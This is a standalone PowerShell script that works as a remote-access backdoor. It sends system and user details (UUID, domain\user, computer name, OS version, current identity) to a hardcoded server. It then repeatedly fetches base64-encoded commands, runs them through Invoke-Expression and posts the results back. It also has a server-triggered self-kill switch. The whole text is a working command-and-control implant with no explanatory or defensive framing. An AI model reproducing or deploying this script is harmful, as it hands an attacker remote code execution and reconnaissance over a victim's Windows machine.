$key='P4YCVQER8UWpfzxVFmVSDyBLzKL3yV6c';
$URL="http://192.168.1.91";
$timeout = 60;
$uuid = (get-wmiobject Win32_ComputerSystemProduct).UUID;
function b64e ($str) {if (!$str) { $str = '' };return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($str));}
function b64d ($str) {return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($str))}
function sendPostReq($a, $ps) {
$ps.Add('p', $a);
$ps.Add('p1', $key);
$ps.Add('p2', (b64e -str $uuid));
$ps.Add('p9', (b64e -str $PID));
$WC = New-Object System.Net.WebClient
$WC.UseDefaultCredentials = $true
$Result = $WC.UploadValues($URL,"post", $NVC);
$result = [System.Text.Encoding]::UTF8.GetString($Result)
$WC.Dispose();
return $result;
}
Sleep $timeout
$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add('p3', (b64e -str "$($env:UserDomain)\$($env:UserName)"));
$NVC.Add('p4', (b64e -str $env:ComputerName));
$NVC.Add('p5', (b64e -str (Get-Item -Path ".\").FullName));
$NVC.Add('p7', (b64e -str (Get-WmiObject -class Win32_OperatingSystem).Caption));
$NVC.Add('p8', (b64e -str (Get-WmiObject Win32_OperatingSystem).OSArchitecture));
$NVC.Add('p10', (b64e -str ([Security.Principal.WindowsIdentity]::GetCurrent().Name)));
$res = (sendPostReq -a 'i' -ps $NVC);
if ($res -eq 'cex01') {
taskkill /F /PID $PID
return
exit
} else {
$timeout =  $res -replace "crx", ""
}
sleep $timeout;
$working=$true
while ($working) {
$NVC = New-Object System.Collections.Specialized.NameValueCollection
$res = (sendPostReq -a 't' -ps $NVC);
if ($res -ne '') {
foreach($line in $res.Split([Environment]::NewLine)) {
if ($line -ne '') {
try {
$decodedCommand = (b64d -str $line);
$comm = $decodedCommand.Split([Environment]::NewLine);
$OutputVariable = (IEX (b64d -str $comm[1])) | Out-String;
if ($?) {
$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add('p3', (b64e -str $OutputVariable));
$NVC.Add('p4', (b64e -str (Get-Item -Path ".\").FullName));
$NVC.Add('p5', (b64e -str $comm[0]));
$res = (sendPostReq -a 'a' -ps $NVC);
} else {
$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add('p3', (b64e -str $error[0]));
$NVC.Add('p4', (b64e -str (Get-Item -Path ".\").FullName));
$NVC.Add('p5', (b64e -str $comm[0]));
$res = (sendPostReq -a 'a' -ps $NVC);
}
} catch {
$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add('p3', (b64e -str $_));
$NVC.Add('p4', (b64e -str (Get-Item -Path ".\").FullName));
$res = (sendPostReq -a 'a' -ps $NVC);
}
$OutputVariable = '';
clear;
}
}
}
sleep $timeout;
}
